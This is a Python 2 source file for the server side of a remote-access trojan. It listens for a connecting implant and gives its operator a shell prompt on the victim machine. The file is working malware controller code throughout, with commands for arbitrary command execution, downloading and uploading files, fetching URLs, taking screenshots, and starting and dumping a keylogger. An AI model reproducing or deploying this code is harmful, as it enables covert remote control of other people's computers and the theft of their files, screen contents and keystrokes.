#!/usr/bin/python
import socket
import json
import base64
import time

#-----------------------------------------------------------------------------------------------------------------
#  class reverse_shell_server
#-----------------------------------------------------------------------------------------------------------------
class reverse_shell_server:
    target     = None
    target_ip  = None
    sever_sock = None 
    prompt     = None

    def get_cmd_arg(self,command):
        '''
            this method is used to retrive the argumentss from
            the typed command (if any arguments are mentioned)
        '''
        cmd_arg_list = command.split(" ")
        command      = cmd_arg_list[0]
        arguments    = cmd_arg_list[1:]
        return command,arguments

    def reliable_send(self, data):
        '''
            used to send data 
        '''    
        self.target.send(json.dumps(data))
    
    def reliable_recv(self):
        '''
            this method is used for receiving large chunks of
            data even if the data is greater than the receive
            buffer size
        '''
        recv_data = ""
        while True:
            try:
                recv_data = recv_data + self.target.recv(1024)
                return json.loads(recv_data)
            except ValueError,TypeError:
                continue

    def establish_connection(self):
        '''
            this method establishes connection with the 
            reverse shell.
        '''
        print "connecting to shell ... "
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("192.168.2.9", 54321))
        sock.listen(5)
        target,ip = sock.accept()
        print "connection established starting shell ..."
        self.target      = target
        self.target_ip   = ip
        self.server_sock = sock
        self.prompt      = "reverse_shell:@{}~# ".format(self.target_ip)
   
    def change_dir(self,command):
        prompt            = self.prompt
        command,arguments = self.get_cmd_arg(command)
        if len(arguments) > 1:
            print prompt+"[error]:too many arguments"
        elif len(arguments) == 0:
            print prompt+"[error] Invalid command"
        else:
            self.reliable_send(command + " " + arguments[0])
            print prompt+self.reliable_recv()
    
    def keylogger_dump(self,command):
        self.reliable_send(command)
        dnloaded_data = self.reliable_recv()
        if dnloaded_data[:7] == "[error]":
            print self.prompt+dnloaded_data
        else:
            with open("recv_keylog.txt", "wb") as downloaded_file:
                    downloaded_file.write(base64.b64decode(dnloaded_data))
                    print self.prompt+" [!] keylog received"

    def download(self, command):
        prompt            = self.prompt
        command,arguments = self.get_cmd_arg(command)
        file_list    = arguments
        if len(file_list)>=1:
            for file_name in file_list:
                if not len(file_name) == 0:
                    self.reliable_send("download "+file_name)
                    dnloaded_data = self.reliable_recv()
                    if dnloaded_data[:7] == "[error]":
                        print prompt+dnloaded_data
                    else:
                        with open(file_name, "wb") as downloaded_file:
                            downloaded_file.write(base64.b64decode(dnloaded_data))
                else:
                    print prompt+"[error]: no file name mentioned"
                    print "[usage]: download [FILENAME].."
        elif len(file_list) == 0:
            print prompt+"[error]: no file name mentioned"
            print "[usage]: download [FILENAME].."
        else:
            print prompt+"[error]: Invalid command"

    def upload(self, command):
        cmd_len           = len(command)
        prompt            = self.prompt
        command,arguments = self.get_cmd_arg(command)
        file_list    = arguments
        if len(file_list)>=1:
            for file_name in file_list:
                if not len(file_name) == 0:
                    self.reliable_send("upload "+file_name)
                    time.sleep(2)
                    try:
                        with open(file_name, "rb") as upload_file:
                            self.reliable_send(base64.b64encode(upload_file.read()))
                            time.sleep(1)
                            print prompt+"uploading "+file_name+"..."
                            time.sleep(1)
                            print prompt+file_name+" uploaded sucessfully!"
                        time.sleep(1)
                    except:
                        print prompt+"[error]: failed to upload "+file_name
                        self.reliable_send("failed")
                        time.sleep(2)
                else:
                    print prompt+"[error]: no file name mentioned"
        else:
            print prompt+"[error]: Invalid command"

    def wget(self, command):
        prompt            = self.prompt
        cmd_len           = len(command)
        command,arguments = self.get_cmd_arg(command)
        if len(arguments) >1:
            print prompt + "[error]: Invalid command"
        elif len(arguments) ==0:
            if cmd_len == 4:
                print prompt + "[error]: missing URL"
                print "[usage]: wget [URL].."
            else:
                print prompt + "[error]: invalid command"
        else:
            self.reliable_send(command + " " + arguments[0])
            print prompt + self.reliable_recv()

    def screenshot(self, command):
        prompt = self.prompt
        if len(command)>10:
            print prompt + "[error]: invalid command"
        else:
            self.reliable_send(command)
            cap_reply = self.reliable_recv()
            if not cap_reply[:7]  == "[error]": 
                file_name = time.strftime("%Y-%m-%d_%H-%M-%S", time.gmtime()) + ".png"
                with open(file_name,"wb") as cap_file:
                    cap_file.write(base64.b64decode(cap_reply))
            else:
                print prompt + "[error]: failed to take screeshot"

    def load_rev_shell(self):
        print "target = ",self.target, "ip = ",self.target_ip
        
        while True:
            prompt       = self.prompt
            command      = raw_input("reverse_shell:@{}~# ".format(self.target_ip))
            #self.reliable_send(command)
            
            if command == "q" or command == "quit" or command == "exit":
                self.reliable_send(command)
                break

            elif len(command)>0 and command[:2] == "cd":
                self.change_dir(command)

            elif len(command)>=8 and command[:8] == "download":
                self.download(command)
            
            elif len(command)>=6 and command[:6] == "upload":
                self.upload(command)
            
            elif command[:4] == "wget":
                self.wget(command)
            
            elif command[:10] == "screenshot":
                self.screenshot(command)
            
            elif len(command) == 15 and command[:15] == "keylogger_start":
                self.reliable_send(command)
            
            elif len(command) == 14 and command[:14] == "keylogger_dump":
                self.keylogger_dump(command)

            else:
                self.reliable_send(command)
                output = self.reliable_recv()
                print prompt+output
    def close_conn(self):
        self.server_sock.close()
                
obj = reverse_shell_server()
obj.establish_connection()
obj.load_rev_shell()
obj.close_conn()

